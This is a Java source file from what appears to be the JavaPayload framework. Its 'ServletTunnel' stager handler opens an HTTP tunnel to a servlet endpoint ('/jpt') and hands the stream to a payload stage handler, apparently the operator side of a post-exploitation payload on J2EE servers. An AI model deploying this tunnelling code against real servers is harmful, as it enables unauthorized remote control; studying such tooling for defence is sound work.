/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.handler.stager;

import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.io.PrintStream;
import java.net.URLEncoder;

import javapayload.handler.stage.StageHandler;
import jtcpfwd.util.PollingHandler;
import jtcpfwd.util.http.HTTPTunnelClient;

public class ServletTunnel extends StagerHandler {

	protected void handle(final StageHandler stageHandler, String[] parameters, PrintStream errorStream, Object extraArg) throws Exception {
		String baseURL = parameters[1]+getURLSuffix();
		if (parameters[1].startsWith(":"))
			baseURL=parameters[1].substring(1);
		String timeout = parameters[2];
		final int timeoutValue;
		if (timeout.equals("--"))
			timeoutValue = 0;
		else
			timeoutValue=Integer.parseInt(timeout);
		StringBuffer paramBuf = new StringBuffer();
		for (int i = 0; i < parameters.length; i++) {
			if (i != 0) paramBuf.append(' ');
			paramBuf.append(parameters[i]);
		}
		String createParam = "create=" + URLEncoder.encode(paramBuf.toString(),"UTF-8");
		PipedInputStream localIn = new PipedInputStream();
		final PollingHandler pth = new PollingHandler(new PipedOutputStream(localIn), 1048576);
		HTTPTunnelClient.handle(baseURL, timeoutValue, createParam, pth, stageHandler.consoleOut, errorStream);
		stageHandler.handle(pth, localIn, parameters);
	}

	protected String getURLSuffix() {
		return "/jpt";
	}

	protected boolean needHandleBeforeStart() {
		throw new IllegalStateException("No extra handler needed");
	}
}
